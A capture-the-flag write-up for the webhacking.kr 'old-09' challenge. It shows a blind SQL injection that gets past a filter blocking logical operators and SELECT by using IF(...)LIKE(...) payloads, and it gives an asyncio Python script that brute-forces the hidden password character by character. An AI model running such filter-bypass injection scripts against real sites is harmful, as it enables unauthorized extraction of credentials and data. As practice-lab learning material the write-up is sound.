# Old 09    SQLi (No Logical Operators)

URL: [https://webhacking.kr/challenge/web-09/](https://webhacking.kr/challenge/web-09/)

![old-09.png](/assets/ctf/webhacking.kr/old-09.png)

1 shows `Apple`
2 shows `Banana`
3 shows: 
```bash
Secret

column : id,no
no 3's id is password
```

Pagination is done by get request: [https://webhacking.kr/challenge/web-09/?no=3](https://webhacking.kr/challenge/web-09/?no=3)

`AND, OR, &&, ||, SUBSTRING, SELECT, FROM, UNION, =, <, >, /` and many others are blocked...

Finally I managed to make SQLi work via `IF((1)LIKE(1),3,1)`
[https://webhacking.kr/challenge/web-09/index.php?no=IF((1)LIKE(1),3,1)](https://webhacking.kr/challenge/web-09/index.php?no=IF((1)LIKE(1),3,1)

Probably some black magic involved here, but on successful IF we got 3rd id field and were able to brute force that way, second thing is that in False statement `1` didn't work? Changing to 0 made bruteforce  successful.

```python
import string
import asyncio
from aiohttp import ClientSession

URL = 'https://webhacking.kr/challenge/web-09/index.php'
COOKIES = {'PHPSESSID': 'hi4uvai5sde90encr0ktq6879f'}
CHARSET = string.ascii_letters + string.digits + '{}!?,/'
PAYLOAD = 'IF(SUBSTR(id,{},1)LIKE({}),3,0)'
SUCCESS = 'Secret'

async def fetch(session, index, char):
    params = {'no': PAYLOAD.format(index, hex(ord(char)))}
    async with session.get(URL, params=params) as resp:
        if SUCCESS in await resp.text():
            return char

        return None

async def main():
    password = 'alsrkswhaql'
    async with ClientSession() as session:
        session.cookie_jar.update_cookies(COOKIES)
        while True:
            password_i = len(password) + 1
            print(f'\r[{password_i}] {password}', end='')
            tasks = [fetch(session, password_i, char) for char in CHARSET]
            results = await asyncio.gather(*tasks)
            for result in results:
                if result:
                    password += result
                    break
            else:
                break
  
        print(f'\r[{password_i}] {password}')

if __name__ == '__main__':
    asyncio.run(main())

# [12] alsrkswhaql
```